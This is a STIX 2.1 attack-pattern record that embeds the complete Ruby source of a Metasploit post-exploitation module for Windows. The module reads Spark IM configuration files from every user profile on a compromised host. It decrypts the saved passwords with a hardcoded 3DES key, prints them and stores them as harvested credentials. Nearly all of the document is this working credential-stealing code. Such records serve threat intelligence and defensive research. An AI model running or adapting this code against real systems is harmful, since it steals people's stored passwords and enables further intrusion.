{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ac93788a-9c3b-4325-9e05-ef1f04619a98",
    "created": "2024-08-14T16:33:08.221536Z",
    "modified": "2024-08-14T16:33:08.221548Z",
    "name": "Windows Gather Spark IM Password Extraction",
    "description": " This module will enumerate passwords stored by the Spark IM client. The encryption key is publicly known. This module will not only extract encrypted password but will also decrypt password using public key.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/spark_im.rb",
            "external_id": "spark_im.rb"
        },
        {
            "source_name": "reference",
            "url": "http://adamcaudill.com/2012/07/27/decrypting-spark-saved-passwords/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Spark IM Password Extraction',\n        'Description' => %q{\n          This module will enumerate passwords stored by the Spark IM client.\n          The encryption key is publicly known. This module will not only extract encrypted\n          password but will also decrypt password using public key.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>',\n          'Thomas McCarthy \"smilingraccoon\" <smilingraccoon[at]gmail.com>'\n        ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          [ 'URL', 'http://adamcaudill.com/2012/07/27/decrypting-spark-saved-passwords/']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # decrypt spark password\n  def decrypt(hash)\n    # code to decrypt hash with KEY\n    encrypted = hash.unpack('m')[0]\n    key = 'ugfpV1dMC5jyJtqwVAfTpHkxqJ0+E0ae'.unpack('m')[0]\n\n    cipher = OpenSSL::Cipher.new 'des-ede3'\n    cipher.decrypt\n    cipher.key = key\n\n    password = cipher.update encrypted\n    password << cipher.final\n\n    password = ::Rex::Text.to_utf8(password)\n\n    user, pass = password.scan(/[[:print:]]+/)\n    cred_opts = {}\n    if pass.nil? || pass.empty?\n      print_status(\"Username found: #{user}, but no password\")\n      cred_opts.merge!(user: user)\n    else\n      print_good(\"Decrypted Username #{user} Password: #{pass}\")\n      cred_opts.merge!(user: user, password: pass)\n    end\n\n    cred_opts.merge!(\n      ip: client.sock.peerhost,\n      port: 5222,\n      service_name: 'spark'\n    )\n\n    report_cred(cred_opts)\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      username: opts[:user],\n      private_type: :password\n    }.merge(service_data)\n\n    if opts[:password]\n      credential_data.merge!(\n        private_data: opts[:password]\n      )\n    end\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # main control method\n  def run\n    grab_user_profiles.each do |user|\n      next if user['AppData'].nil?\n\n      accounts = user['AppData'] + '\\\\Spark\\\\spark.properties'\n\n      # open the file for reading\n      config = begin\n        client.fs.file.new(accounts, 'r')\n      rescue StandardError\n        nil\n      end\n      next if config.nil?\n\n      print_status(\"Config found for user #{user['UserName']}\")\n\n      # read the contents of file\n      contents = config.read\n\n      # look for lines containing string 'password'\n      password = contents.split(\"\\n\").grep(/password/)\n      if password.nil?\n        # file doesn't contain a password\n        print_status(\"#{file} does not contain any saved passwords\")\n        # close file and return\n        config.close\n        return\n      end\n\n      # store the hash close the file\n      password = password.delete_if { |e| e !~ /password.+=.+=\\r/ }\n      password.each do |pass|\n        if pass.nil?\n          next\n        end\n\n        hash = pass.split('password').join.chomp\n        vprint_status(\"Spark password hash: #{hash}\")\n\n        # call method to decrypt hash\n        decrypt(hash)\n      end\n      config.close\n    end\n  end\nend\n"
}